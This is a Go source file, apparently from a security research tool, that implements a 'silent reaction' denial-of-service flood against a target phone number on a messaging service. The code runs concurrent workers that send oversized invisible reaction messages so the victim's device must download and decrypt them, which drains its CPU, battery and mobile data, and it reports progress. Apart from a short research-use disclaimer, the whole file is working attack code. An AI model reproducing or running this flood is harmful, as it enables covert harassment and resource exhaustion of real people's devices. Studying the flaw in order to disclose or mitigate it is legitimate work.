// Package flood implements the silent-reaction denial-of-service flood.
//
// RESEARCH USE ONLY. The flood sends a sustained, high-concurrency stream of
// oversized silent reaction messages to a target number, forcing the target
// device to download and decrypt large volumes of data and so draining its
// CPU, battery, and mobile data. Only run it against devices and accounts you
// own or are explicitly authorised to test.
package flood

import (
	"context"
	"errors"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/ctrlsam/careless-whisper-go/internal/messenger"
)

const bytesPerGiB = 1 << 30

// DefaultPayloadSize is the per-message reaction payload (1 MiB).
const DefaultPayloadSize = 1 << 20

// Settings configures a flood run.
type Settings struct {
	PhoneNumber        string
	ConcurrentWorkers  int
	DelayBetween       time.Duration
	Duration           time.Duration // zero means run until the context is cancelled
	MaxMessages        int           // zero means unlimited
	PayloadSize        int
	ReportInterval     time.Duration
	IgnoreUnregistered bool
	// NoAck skips waiting for the per-message server ack, raising throughput.
	NoAck bool
}

func (s Settings) withDefaults() Settings {
	if s.ConcurrentWorkers <= 0 {
		s.ConcurrentWorkers = 10
	}
	if s.PayloadSize <= 0 {
		s.PayloadSize = DefaultPayloadSize
	}
	if s.ReportInterval <= 0 {
		s.ReportInterval = 5 * time.Second
	}
	return s
}

// Stats holds running totals for an in-progress or completed flood.
type Stats struct {
	Sent      int64
	Failed    int64
	StartedAt time.Time
	Elapsed   time.Duration
}

// Rate returns messages sent per second over the elapsed window.
func (s Stats) Rate() float64 {
	seconds := s.Elapsed.Seconds()
	if seconds <= 0 {
		return 0
	}
	return float64(s.Sent) / seconds
}

// EstimatedGiB estimates the data the target was forced to handle.
func (s Stats) EstimatedGiB(payloadSize int) float64 {
	return float64(s.Sent*int64(payloadSize)) / bytesPerGiB
}

// BuildPayload returns an ASCII reaction string of the requested byte size.
func BuildPayload(size int) (string, error) {
	if size <= 0 {
		return "", errors.New("payload size must be positive")
	}
	return strings.Repeat("A", size), nil
}

// Reporter receives progress and lifecycle messages during a flood.
type Reporter interface {
	Progress(stats Stats, payloadSize int)
	Warn(string)
	Info(string)
}

// Run floods the target until a stop condition is reached or ctx is cancelled.
func Run(ctx context.Context, m messenger.Messenger, settings Settings, reporter Reporter) (Stats, error) {
	settings = settings.withDefaults()

	warn := func(string) {}
	if reporter != nil {
		warn = reporter.Warn
	}
	if err := messenger.ConfirmNumber(ctx, m, settings.PhoneNumber, settings.IgnoreUnregistered, warn); err != nil {
		return Stats{}, err
	}

	payload, err := BuildPayload(settings.PayloadSize)
	if err != nil {
		return Stats{}, err
	}

	runCtx := ctx
	var cancel context.CancelFunc
	if settings.Duration > 0 {
		runCtx, cancel = context.WithTimeout(ctx, settings.Duration)
		defer cancel()
	}

	var sent, failed int64
	started := time.Now()

	shouldContinue := func() bool {
		if settings.MaxMessages > 0 && atomic.LoadInt64(&sent) >= int64(settings.MaxMessages) {
			return false
		}
		return runCtx.Err() == nil
	}

	var wg sync.WaitGroup
	sendOpts := messenger.SendOptions{NoAck: settings.NoAck}
	worker := func() {
		defer wg.Done()
		for shouldContinue() {
			if _, err := m.SendSilentMessage(runCtx, settings.PhoneNumber, payload, sendOpts); err != nil {
				atomic.AddInt64(&failed, 1)
				if runCtx.Err() != nil {
					return
				}
				continue
			}
			atomic.AddInt64(&sent, 1)
			if settings.DelayBetween > 0 {
				select {
				case <-runCtx.Done():
					return
				case <-time.After(settings.DelayBetween):
				}
			}
		}
	}

	snapshot := func() Stats {
		return Stats{
			Sent:      atomic.LoadInt64(&sent),
			Failed:    atomic.LoadInt64(&failed),
			StartedAt: started,
			Elapsed:   time.Since(started),
		}
	}

	reportDone := make(chan struct{})
	if reporter != nil {
		go func() {
			ticker := time.NewTicker(settings.ReportInterval)
			defer ticker.Stop()
			for {
				select {
				case <-runCtx.Done():
					return
				case <-reportDone:
					return
				case <-ticker.C:
					reporter.Progress(snapshot(), settings.PayloadSize)
				}
			}
		}()
	}

	for i := 0; i < settings.ConcurrentWorkers; i++ {
		wg.Add(1)
		go worker()
	}
	wg.Wait()
	close(reportDone)

	final := snapshot()
	if reporter != nil {
		reporter.Progress(final, settings.PayloadSize)
	}
	return final, nil
}
